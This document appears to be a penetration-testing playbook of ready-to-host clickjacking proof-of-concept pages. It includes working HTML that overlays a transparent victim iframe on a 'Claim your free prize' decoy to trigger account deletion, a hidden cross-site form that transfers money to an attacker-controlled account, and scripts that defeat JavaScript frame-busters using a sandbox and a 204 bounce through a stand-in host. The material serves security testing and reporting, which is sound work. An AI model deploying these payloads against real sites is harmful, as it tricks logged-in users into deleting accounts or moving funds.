# Clickjacking framing PoCs + frame-buster evasion — Open WHEN: a sensitive action page returns no X-Frame-Options / no CSP frame-ancestors and you need a ready-to-host framing PoC, or the page ships a JS frame-buster you must defeat

These are full HTML files to host on a separate origin. They frame the
victim page so a credentialed user who clicks your decoy actually clicks a
control inside the framed sensitive action. Clickjacking needs **one user
click**, unlike token-less CSRF which needs none — use it when the action
sits behind a button the server protects with a CSRF token (the framed page
carries the user's real session + token, so the token check passes).

## Detection oracle — is the page framable?

Test the exact sensitive-action URL, not just the home page. A page is
framable when the response is missing BOTH controls:

```bash
U='https://victim.example/account/delete'
curl -sI -b "session=$C" "$U" | grep -iE 'x-frame-options|content-security-policy'
```

Framable if neither header is present, OR:
- `X-Frame-Options` is set but the value is malformed / unknown (browsers
  ignore an unrecognised value — e.g. a stray `ALLOW-FROM`, which modern
  browsers no longer honour, leaves the page framable).
- `Content-Security-Policy` exists but has **no** `frame-ancestors`
  directive (XFO is the only frame control then; if XFO is also absent →
  framable).
- `frame-ancestors` lists an origin you control, or is overly broad
  (`*`, `https:`).
- The header is sent on the home page but NOT on the deep action URL
  (per-route inconsistency is common).

`nuclei` ships templates that flag missing XFO / clickjackable pages — run
`nuclei -t http/misconfiguration/ -u "$U"` for a quick sweep, but always
confirm with a real framing PoC against the sensitive route.

## Basic frame test

If this renders the victim page inside the box, it is framable:

```html
<html><body>
<h3>Loading rewards...</h3>
<iframe src="https://victim.example/account/settings" width="800" height="600"></iframe>
</body></html>
```

## UI redressing — transparent victim over a decoy

The victim iframe is made fully transparent (`opacity:0`) and stacked on
top (`z-index`) of an enticing decoy. The user aims for the decoy button
but the click lands on the framed action control. Align the iframe so the
real control sits exactly under the decoy.

```html
<style>
  iframe { position:absolute; top:0; left:0; width:1000px; height:700px;
           opacity:0.0; z-index:2; }
  #decoy { position:absolute; top:300px; left:260px; z-index:1; }
</style>
<div id="decoy"><button>Claim your free prize</button></div>
<iframe src="https://victim.example/account/delete"></iframe>
```

Tuning: temporarily set `opacity:0.3` to line up the framed button under
the decoy, then drop it back to `0`. Adjust the iframe `top`/`left` (can be
negative) so only the target control overlaps the decoy.

## Invisible frame — zero-size iframe

Hides the framed page entirely; the decoy alone is visible. Useful when you
just need the click to reach one fixed control whose position you scroll to.

```html
<iframe src="https://victim.example/account/delete"
        style="opacity:0; height:0; width:0; border:none;"></iframe>
```

## Button / form hijack — decoy triggers a hidden form

Not strictly framing the victim, but the sibling technique PATT groups
here: a visible decoy button submits a hidden cross-origin form (this is
plain CSRF dressed as a click — works only when no token is required).

```html
<button onclick="document.getElementById('hf').submit()">Play</button>
<form id="hf" action="https://victim.example/transfer" method="POST" style="display:none">
  <input type="hidden" name="to" value="ctl-account">
  <input type="hidden" name="amount" value="1000">
</form>
```

## Drag-and-drop / multi-click sequences

Some flows need two aligned clicks (e.g. open a confirm dialog, then
confirm). Stack two decoys and reposition the transparent iframe between
clicks with a small script, or use a slider/"drag to win" decoy that maps a
drag gesture onto a confirm button. Keep each step's framed control under
the matching decoy.

## Defeating JS frame-busters

Older pages self-bust with JS like:

```html
<script>if (top != self) { top.location = self.location; }</script>
```

Evasions (test in order of least to most fragile):

1. **`sandbox` without `allow-top-navigation`** — the iframe cannot
   redirect the top window, so the buster's `top.location=` is a no-op:
   ```html
   <iframe src="https://victim.example/x" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
   ```
   (Omit `allow-top-navigation`; keep `allow-forms`/`allow-scripts` so the
   action still works.)

2. **`onbeforeunload` cancel** — count navigation attempts the buster makes
   and bounce the top frame to a 204 response so the navigation aborts and
   the user is never moved:
   ```html
   <script>
     var n = 0;
     window.onbeforeunload = function(){ n++; };
     setInterval(function(){
       if (n > 0){ n -= 2; window.top.location = "https://ctl.example/204"; }
     }, 1);
   </script>
   <iframe src="https://victim.example/x"></iframe>
   ```
   The `https://ctl.example/204` URL must answer `HTTP/1.1 204 No Content`
   (e.g. `<?php header("HTTP/1.1 204 No Content"); ?>`), which performs no
   navigation, so the framed page stays put.

3. **Restricted-frame attribute (legacy IE only)** — `security="restricted"`
   disabled JS inside the frame; not useful on modern engines, listed for
   completeness.

If the page sends `X-Frame-Options: DENY`/`SAMEORIGIN` or a CSP
`frame-ancestors 'self'`, none of these help — the browser refuses to
render the frame at all. Clickjacking is then a dead end; report the
control as present and move on.

## Reporting impact

A clickjacking finding is real only when: the sensitive-action page frames
(no/weak XFO + no `frame-ancestors`), a single click on your decoy reaches a
state-changing control, and before/after account state proves the action
fired. Pair with the CSRF curl matrix in `poc-payloads.md` to show the
action itself has no second-factor (re-auth, token-in-body) that the framed
click would miss.
